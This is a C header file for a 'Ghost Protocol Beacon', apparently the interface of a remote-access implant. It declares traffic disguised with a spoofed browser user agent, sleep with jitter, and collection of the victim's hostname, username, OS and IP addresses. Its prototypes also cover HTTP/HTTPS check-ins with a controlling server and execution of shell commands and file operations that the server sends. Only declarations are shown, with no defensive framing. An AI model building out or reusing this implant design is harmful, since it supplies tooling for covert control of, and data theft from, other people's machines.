/*
 * Ghost Protocol Beacon - C Implementation
 * Header file for the main beacon functionality
 */

#ifndef BEACON_H
#define BEACON_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "wininet.lib")
    #include <wininet.h>
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <sys/utsname.h>
#endif

// Configuration constants
#define MAX_URL_LEN 512
#define MAX_BUFFER_SIZE 8192
#define MAX_COMMAND_SIZE 4096
#define MAX_OUTPUT_SIZE 16384
#define BEACON_ID_LEN 37  // UUID format
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

// Beacon configuration structure
typedef struct {
    char server_url[MAX_URL_LEN];
    char beacon_id[BEACON_ID_LEN];
    char user_agent[256];
    int sleep_interval;
    int jitter_percent;
    int verify_ssl;
    char proxy_url[MAX_URL_LEN];
} beacon_config_t;

// System information structure
typedef struct {
    char hostname[256];
    char username[256];
    char os_name[64];
    char os_version[128];
    char architecture[32];
    int pid;
    char cwd[512];
    char ip_addresses[1024];
} system_info_t;

// Command structure
typedef struct {
    char id[64];
    char command[256];
    char args[MAX_COMMAND_SIZE];
} command_t;

// Command result structure
typedef struct {
    char command_id[64];
    int success;
    char output[MAX_OUTPUT_SIZE];
    char timestamp[32];
} command_result_t;

// Function prototypes

// Core beacon functions
int beacon_initialize(beacon_config_t* config);
int beacon_start(beacon_config_t* config);
void beacon_cleanup(void);
int beacon_main_loop(beacon_config_t* config);

// Communication functions
int http_checkin(beacon_config_t* config, system_info_t* sysinfo, 
                command_result_t* results, int result_count,
                command_t** commands, int* command_count);
int https_checkin(beacon_config_t* config, system_info_t* sysinfo,
                 command_result_t* results, int result_count,
                 command_t** commands, int* command_count);

// System information functions
int collect_system_info(system_info_t* sysinfo);
void get_current_timestamp(char* buffer, size_t buffer_size);
void generate_uuid(char* buffer);

// Command execution functions
int execute_command(command_t* cmd, command_result_t* result);
int execute_shell_command(const char* command, char* output, size_t output_size);
int execute_file_operation(const char* operation, const char* path, char* output, size_t output_size);

// Utility functions
void sleep_with_jitter(int base_seconds, int jitter_percent);
int parse_url(const char* url, char* hostname, int* port, char* path, int* use_ssl);
char* url_encode(const char* str);
void string_replace(char* str, const char* find, const char* replace);

// Cross-platform compatibility functions
#ifdef _WIN32
    #define sleep(x) Sleep((x) * 1000)
    #define strcasecmp _stricmp
#endif

#endif // BEACON_H
